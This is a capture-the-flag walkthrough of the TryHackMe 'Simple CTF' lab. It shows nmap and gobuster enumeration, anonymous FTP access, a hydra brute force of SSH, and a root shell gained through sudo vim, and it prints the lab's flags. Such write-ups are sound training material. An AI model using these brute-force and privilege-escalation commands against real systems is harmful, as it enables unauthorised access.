# Simple CTF

{% embed url="https://tryhackme.com/room/easyctf" %}

## <mark style="color:blue;">**Nmap**</mark>

* sudo nmap -Pn -A -p- --min-rate=1000 10.10.242.61

```
21/tcp   open  ftp     vsftpd 3.0.3

|      Connected to ::ffff:10.6.3.38
|      Logged in as ftp

| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT

80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))

| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3

2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
```

## <mark style="color:blue;">**GoBuster**</mark>

* gobuster dir -u http://10.10.242.61 -w /usr/share/wordlists/dirb/common.txt

```
/index.html           (Status: 200) [Size: 11321]
/robots.txt           (Status: 200) [Size: 929]
/server-status        (Status: 403) [Size: 300]
/simple               (Status: 301) [Size: 313] [--> http://10.10.242.61/simple/]
```

## <mark style="color:blue;">**/robots.txt**</mark>

```
User-agent: *
Disallow: /
Disallow: /openemr-5_0_1_3 
# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
```

## <mark style="color:blue;">**FTP**</mark>

* ftp ftp@10.10.242.61
* ls

```
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
```

* cd pub
* ls

```
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
```

* get ForMitch.txt
* cat ForMitch.txt

{% code overflow="wrap" %}
```
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```
{% endcode %}

## <mark style="color:blue;">**Hydra (mitch)**</mark>

* hydra -V -l mitch -P /usr/share/wordlists/rockyou.txt 10.10.242.61 -s 2222 ssh

```
[2222][ssh] host: 10.10.242.61   login: mitch   password: secret
```

## <mark style="color:blue;">**SSH**</mark>

* ssh -p 2222 mitch@10.10.242.61
* id; sudo -l; ls -Al \~ /home /root

```
uid=1001(mitch) gid=1001(mitch) groups=1001(mitch)

User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

/home:
total 8
drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch
drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath

/home/mitch:
-rw-rw-r-- 1 mitch mitch   19 aug 17  2019 user.txt

ls: cannot open directory '/root': Permission denied
```

## <mark style="color:blue;">**user.txt**</mark>

* cat user.txt

```
G00d j0b, keep up!
```

## <mark style="color:blue;">**Privilege Escalation**</mark>

* [https://gtfobins.github.io/gtfobins/vim/#sudo](https://gtfobins.github.io/gtfobins/vim/#sudo)
* sudo /usr/bin/vim -c ':!/bin/sh'
* id; ls -Al /root

```
uid=0(root) gid=0(root) groups=0(root)

-rw-r--r-- 1 root root   24 aug 17  2019 root.txt
```

## <mark style="color:blue;">**root.txt**</mark>

* cat /root/root.txt

```
W3ll d0n3. You made it!
```
